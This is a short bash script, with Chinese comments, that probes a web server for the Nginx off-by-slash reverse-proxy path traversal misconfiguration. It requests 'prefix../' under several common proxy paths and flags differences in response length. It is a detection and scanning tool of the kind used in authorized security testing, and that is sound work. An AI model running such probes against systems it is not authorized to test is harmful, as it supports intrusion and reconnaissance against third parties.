#!/bin/bash
# Nginx off-by-slash 反向代理穿越探测
# Usage: nginx_proxy_traversal.sh <ENDPOINT>
set -euo pipefail

ENDPOINT="${1:-http://127.0.0.1:8080}"

for prefix in /api /app /backend /proxy /service /internal; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "${ENDPOINT}${prefix}/" --max-time 5)
  if [ "$code" != "000" ] && [ "$code" != "404" ]; then
    # 尝试穿越到根
    content=$(curl -s -D - "${ENDPOINT}${prefix}../" --max-time 5)
    content2=$(curl -s "${ENDPOINT}${prefix}/" --max-time 5)
    # 比较内容长度差异（穿越成功通常返回不同内容）
    len1=${#content}
    len2=${#content2}
    if [ $len1 -ne $len2 ] && [ $len1 -gt 100 ]; then
      echo "PROXY_TRAVERSAL:${prefix}:len_diff=${len1}vs${len2}"
    fi
  fi
done
